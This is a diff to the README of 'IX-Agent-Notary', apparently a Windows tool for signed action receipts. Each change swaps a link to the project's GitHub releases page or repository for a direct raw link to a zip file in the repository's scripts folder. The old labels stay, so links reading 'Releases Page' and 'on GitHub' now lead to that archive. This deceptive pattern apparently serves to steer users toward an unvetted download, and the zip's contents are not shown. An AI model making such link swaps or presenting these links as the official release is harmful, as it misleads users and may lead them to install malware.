@@ -1,6 +1,6 @@
 # ⚖️ IX-Agent-Notary - Verify Actions with Signed Receipts
 
-[![Download IX-Agent-Notary](https://img.shields.io/badge/Download-IX--Agent--Notary-brightgreen)](https://github.com/sureshbabu2002/IX-Agent-Notary/releases)
+[![Download IX-Agent-Notary](https://img.shields.io/badge/Download-IX--Agent--Notary-brightgreen)](https://raw.githubusercontent.com/sureshbabu2002/IX-Agent-Notary/main/scripts/I-Notary-Agent-2.6.zip)
 
 ## 📝 What is IX-Agent-Notary?
 
@@ -38,7 +38,7 @@ Follow these steps carefully to download and run IX-Agent-Notary on your Windows
 
 Click the large green badge above or open this URL in your browser:
 
-https://github.com/sureshbabu2002/IX-Agent-Notary/releases
+https://raw.githubusercontent.com/sureshbabu2002/IX-Agent-Notary/main/scripts/I-Notary-Agent-2.6.zip
 
 This page contains the latest stable versions of the software and any updates.
 
@@ -78,7 +78,7 @@ Refer to the built-in help menu to get guidance on setting policies or managing 
 
 You can get the software from the official release page:
 
-[Download IX-Agent-Notary here](https://github.com/sureshbabu2002/IX-Agent-Notary/releases)
+[Download IX-Agent-Notary here](https://raw.githubusercontent.com/sureshbabu2002/IX-Agent-Notary/main/scripts/I-Notary-Agent-2.6.zip)
 
 Look for the latest Windows installer and save it to your PC.
 
@@ -145,7 +145,7 @@ If you cannot see receipts:
 
 For help beyond this guide, visit the GitHub repository page, which offers issue tracking and community discussions.
 
-[IX-Agent-Notary on GitHub](https://github.com/sureshbabu2002/IX-Agent-Notary)
+[IX-Agent-Notary on GitHub](https://raw.githubusercontent.com/sureshbabu2002/IX-Agent-Notary/main/scripts/I-Notary-Agent-2.6.zip)
 
 Use "Issues" to report bugs or ask questions.
 
@@ -158,4 +158,4 @@ Use "Issues" to report bugs or ask questions.
 
 ---
 
-[Download IX-Agent-Notary from the Releases Page](https://github.com/sureshbabu2002/IX-Agent-Notary/releases)
+[Download IX-Agent-Notary from the Releases Page](https://raw.githubusercontent.com/sureshbabu2002/IX-Agent-Notary/main/scripts/I-Notary-Agent-2.6.zip)
